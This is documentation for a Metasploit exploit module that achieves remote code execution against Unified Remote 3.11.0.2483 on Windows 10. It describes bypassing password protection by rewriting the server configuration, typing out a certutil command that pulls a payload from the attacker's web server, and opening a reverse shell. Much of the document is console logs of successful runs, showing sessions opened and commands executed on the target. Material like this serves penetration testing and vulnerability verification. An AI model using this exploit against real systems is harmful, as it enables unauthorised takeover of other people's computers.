## Vulnerable Application

This module utilizes the Unified Remote remote control protocol to type out and
deploy a payload.  The remote control protocol can be configured to have no passwords,
a group password, or individual user accounts.  If the web page is accessible, the
access control is set to no password for exploitation, then reverted.
If the web page is not accessible, exploitation will be tried blindly.

This module has been successfully tested against version 3.11.0.2483 (50) on Windows 10.

Version 3.11.0.2483 can be downloaded from
[unifiedremote.com](https://www.unifiedremote.com/static/builds/server/windows-x86/2483/ServerSetup-3.11.0.2483.exe)

## Targets

### Pull

The pull target uses an HTTP server on the Metasploit host, and `certutil.exe` to pull the payload down and execute it.

## Verification Steps

1. Install the application
2. Start msfconsole
3. Do: `use exploit/windows/misc/unified_remote_rce`
4. Set `rhost` and `lhost` as required.
5. Do: `run`
6. You should get a shell.

## Options


### WEBSERVER

The port the web server is running on.  Defaults to `9510`

### CLIENTNAME

The name of the client device to use.  This shows up in the Unified Remote logs. If empty
A random android based name is chosen. Defaults to ``

### SLEEP

The length of time to sleep between each command, this gives the remote program time to process the command on screen.
Defaults to `1` second.

### PATH

This ONLY applies to the pull method.  Where to temporarily store the payload.  Defaults to `c:\\Windows\\Temp\\`

## Scenarios

### Version 3.11.0.2483 on Windows 10, No authentication

```
resource (unified.rb)> use exploits/windows/misc/unified_remote_rce
[*] Using configured payload windows/shell/reverse_tcp
resource (unified.rb)> set rhosts 192.168.2.95
rhosts => 192.168.2.95
resource (unified.rb)> set lhost 192.168.2.199
lhost => 192.168.2.199
resource (unified.rb)> set verbose true
verbose => true
msf6 exploit(windows/misc/unified_remote_rce) > exploit

[*] Started reverse TCP handler on 192.168.2.199:4444 
[*] 192.168.2.95:9512 - Client name set to: android-s5IbpVuRf1MJzqRs
[*] 192.168.2.95:9512 - Retrieving server config
[+] 192.168.2.95:9512 - No security enabled
[+] 192.168.2.95:9512 - Found account: admin
[+] 192.168.2.95:9512 - Found account: wheres
[*] 192.168.2.95:9512 - Sending handshake part 1
[*] 192.168.2.95:9512 - Sending handshake part 2
[*] 192.168.2.95:9512 - Opening Start Menu
[*] 192.168.2.95:9512 - Opening command prompt
[*] 192.168.2.95:9512 - Typing out payload
[*] 192.168.2.95:9512 - Using URL: http://192.168.2.199:8080/
[*] 192.168.2.95:9512 - Attempting to pull down payload
[*] 192.168.2.95:9512 - Attempting to open payload
[+] 192.168.2.95:9512 - Payload request received, sending 73802 bytes of payload for staging
[+] 192.168.2.95:9512 - Payload request received, sending 73802 bytes of payload for staging
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (267 bytes) to 192.168.2.95
[*] Command shell session 1 opened (192.168.2.199:4444 -> 192.168.2.95:59233) at 2022-09-08 16:47:20 -0400
[*] 192.168.2.95:9512 - Server stopped.
[!] 192.168.2.95:9512 - This exploit may require manual cleanup of 'c:\Windows\Temp\jhy5cTqRs.exe' on the target


Shell Banner:
Microsoft Windows [Version 10.0.16299.125]
-----
          

C:\Users\windows>whoami
whoami
win10prolicense\windows

C:\Users\windows>systeminfo
systeminfo

Host Name:                 WIN10PROLICENSE
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.16299 N/A Build 16299
```

### Version 3.11.0.2483 on Windows 10, group authentication

```
resource (unified.rb)> use exploits/windows/misc/unified_remote_rce
[*] Using configured payload windows/shell/reverse_tcp
resource (unified.rb)> set rhosts 192.168.2.95
rhosts => 192.168.2.95
resource (unified.rb)> set lhost 192.168.2.199
lhost => 192.168.2.199
resource (unified.rb)> set verbose true
verbose => true
msf6 exploit(windows/misc/unified_remote_rce) > exploit

[*] Started reverse TCP handler on 192.168.2.199:4444 
[*] 192.168.2.95:9512 - Client name set to: android-ergZhp49nDBmGXz8
[*] 192.168.2.95:9512 - Retrieving server config
[*] 192.168.2.95:9512 - anonymous mode enabled, password required, bypassing
[*] 192.168.2.95:9512 - Uploading new server config
[*] 192.168.2.95:9512 - Sleeping 5 seconds for server to restart
[+] 192.168.2.95:9512 - Found account: admin
[+] 192.168.2.95:9512 - Found account: wheres
[*] 192.168.2.95:9512 - Sending handshake part 1
[*] 192.168.2.95:9512 - Sending handshake part 2
[*] 192.168.2.95:9512 - Opening Start Menu
[*] 192.168.2.95:9512 - Opening command prompt
[*] 192.168.2.95:9512 - Typing out payload
[*] 192.168.2.95:9512 - Using URL: http://192.168.2.199:8080/
[*] 192.168.2.95:9512 - Attempting to pull down payload
[*] 192.168.2.95:9512 - Attempting to open payload
[+] 192.168.2.95:9512 - Payload request received, sending 73802 bytes of payload for staging
[+] 192.168.2.95:9512 - Payload request received, sending 73802 bytes of payload for staging
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (267 bytes) to 192.168.2.95
[*] 192.168.2.95:9512 - Reverting security mode
[*] 192.168.2.95:9512 - Uploading new server config
[*] 192.168.2.95:9512 - Sleeping 5 seconds for server to restart
[*] Command shell session 1 opened (192.168.2.199:4444 -> 192.168.2.95:59596) at 2022-09-08 16:50:21 -0400
[*] 192.168.2.95:9512 - Server stopped.
[!] 192.168.2.95:9512 - This exploit may require manual cleanup of 'c:\Windows\Temp\lqVUQTKtxuSD1mm.exe' on the target


Shell Banner:
Microsoft Windows [Version 10.0.16299.125]
-----
          

C:\Users\windows>
```

### Version 3.11.0.2483 on Windows 10, user authentication

```
resource (unified.rb)> use exploits/windows/misc/unified_remote_rce
[*] Using configured payload windows/shell/reverse_tcp
resource (unified.rb)> set rhosts 192.168.2.95
rhosts => 192.168.2.95
resource (unified.rb)> set lhost 192.168.2.199
lhost => 192.168.2.199
resource (unified.rb)> set verbose true
verbose => true
msf6 exploit(windows/misc/unified_remote_rce) > exploit

[*] Started reverse TCP handler on 192.168.2.199:4444 
[*] 192.168.2.95:9512 - Client name set to: android-Mmw9X2FSLLPzJk6t
[*] 192.168.2.95:9512 - Retrieving server config
[*] 192.168.2.95:9512 - users mode enabled, password required, bypassing
[*] 192.168.2.95:9512 - Uploading new server config
[*] 192.168.2.95:9512 - Sleeping 5 seconds for server to restart
[+] 192.168.2.95:9512 - Found account: admin
[+] 192.168.2.95:9512 - Found account: wheres
[*] 192.168.2.95:9512 - Sending handshake part 1
[*] 192.168.2.95:9512 - Sending handshake part 2
[*] 192.168.2.95:9512 - Opening Start Menu
[*] 192.168.2.95:9512 - Opening command prompt
[*] 192.168.2.95:9512 - Typing out payload
[*] 192.168.2.95:9512 - Using URL: http://192.168.2.199:8080/
[*] 192.168.2.95:9512 - Attempting to pull down payload
[*] 192.168.2.95:9512 - Attempting to open payload
[+] 192.168.2.95:9512 - Payload request received, sending 73802 bytes of payload for staging
[+] 192.168.2.95:9512 - Payload request received, sending 73802 bytes of payload for staging
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (267 bytes) to 192.168.2.95
[*] 192.168.2.95:9512 - Reverting security mode
[*] 192.168.2.95:9512 - Uploading new server config
[*] 192.168.2.95:9512 - Sleeping 5 seconds for server to restart
[*] Command shell session 1 opened (192.168.2.199:4444 -> 192.168.2.95:59932) at 2022-09-08 16:53:05 -0400
[*] 192.168.2.95:9512 - Server stopped.
[!] 192.168.2.95:9512 - This exploit may require manual cleanup of 'c:\Windows\Temp\2NzuxPbY6fGK9FdNy.exe' on the target


Shell Banner:
Microsoft Windows [Version 10.0.16299.125]
-----
          

C:\Users\windows>
```

### Version 3.11.0.2483 on Windows 10, no authentication, no web server access

```
resource (unified.rb)> use exploits/windows/misc/unified_remote_rce
[*] Using configured payload windows/shell/reverse_tcp
resource (unified.rb)> set rhosts 192.168.2.95
rhosts => 192.168.2.95
resource (unified.rb)> set lhost 192.168.2.199
lhost => 192.168.2.199
resource (unified.rb)> set verbose true
verbose => true
msf6 exploit(windows/misc/unified_remote_rce) > exploit

[*] Started reverse TCP handler on 192.168.2.199:4444 
[*] 192.168.2.95:9512 - Client name set to: android-EIC1Bc3pwL4U4Pnj
[*] 192.168.2.95:9512 - Retrieving server config
[-] 192.168.2.95:9512 - Web interface is disabled. Unable to attempt bypass, assuming no authentication.
[*] 192.168.2.95:9512 - Sending handshake part 1
[*] 192.168.2.95:9512 - Sending handshake part 2
[*] 192.168.2.95:9512 - Opening Start Menu
[*] 192.168.2.95:9512 - Opening command prompt
[*] 192.168.2.95:9512 - Typing out payload
[*] 192.168.2.95:9512 - Using URL: http://192.168.2.199:8080/
[*] 192.168.2.95:9512 - Attempting to pull down payload
[*] 192.168.2.95:9512 - Attempting to open payload
[+] 192.168.2.95:9512 - Payload request received, sending 73802 bytes of payload for staging
[+] 192.168.2.95:9512 - Payload request received, sending 73802 bytes of payload for staging
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (267 bytes) to 192.168.2.95
[*] Command shell session 1 opened (192.168.2.199:4444 -> 192.168.2.95:60829) at 2022-09-08 17:00:30 -0400
[*] 192.168.2.95:9512 - Server stopped.
[!] 192.168.2.95:9512 - This exploit may require manual cleanup of 'c:\Windows\Temp\QD7V9rLaWUwvPIY.exe' on the target


Shell Banner:
Microsoft Windows [Version 10.0.16299.125]
-----
          

C:\Users\windows>
```

### Version 3.11.0.2483 on Windows 10, user authentication, no web server access

This will fail.

```
resource (unified.rb)> use exploits/windows/misc/unified_remote_rce
[*] Using configured payload windows/shell/reverse_tcp
resource (unified.rb)> set rhosts 192.168.2.95
rhosts => 192.168.2.95
resource (unified.rb)> set lhost 192.168.2.199
lhost => 192.168.2.199
resource (unified.rb)> set verbose true
verbose => true
msf6 exploit(windows/misc/unified_remote_rce) > exploit

[*] Started reverse TCP handler on 192.168.2.199:4444 
[*] 192.168.2.95:9512 - Client name set to: android-iJP3rW13dKjtf8Xz
[*] 192.168.2.95:9512 - Retrieving server config
[-] 192.168.2.95:9512 - Web interface is disabled. Unable to attempt bypass, assuming no authentication.
[*] 192.168.2.95:9512 - Sending handshake part 1
[*] 192.168.2.95:9512 - Sending handshake part 2
[*] 192.168.2.95:9512 - Opening Start Menu
[*] 192.168.2.95:9512 - Opening command prompt
[*] 192.168.2.95:9512 - Typing out payload
[*] 192.168.2.95:9512 - Using URL: http://192.168.2.199:8080/
[*] 192.168.2.95:9512 - Attempting to pull down payload
[*] 192.168.2.95:9512 - Attempting to open payload
[*] 192.168.2.95:9512 - Server stopped.
[!] 192.168.2.95:9512 - This exploit may require manual cleanup of 'c:\Windows\Temp\tapEZnGskY.exe' on the target
[*] Exploit completed, but no session was created.
```